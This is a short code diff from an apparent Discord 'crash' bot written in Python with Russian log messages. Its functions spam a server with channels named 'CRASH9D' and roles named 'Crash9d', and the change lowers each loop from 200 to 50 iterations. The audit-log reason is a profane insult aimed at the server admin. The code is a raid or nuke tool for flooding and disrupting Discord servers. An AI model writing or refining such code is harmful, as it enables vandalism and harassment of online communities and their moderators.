@@ -92,7 +92,7 @@ async def masks(ctx):
 
 async def spamch(ctx):
     print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Начинаем спам")
-    for b in range(200):
+    for b in range(50):
         try:
                 await ctx.guild.create_text_channel("CRASH9D", reason='Админ ебанутый')
                 print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Создал канал")
@@ -102,7 +102,7 @@ async def spamch(ctx):
 
 async def spamrl(ctx):   
     print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Спамим ролями")
-    for a in range(200):
+    for a in range(50):
         try:
                 await ctx.guild.create_role(name="Crash9d", reason='Админ ебанутый')
                 print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Создал роль")
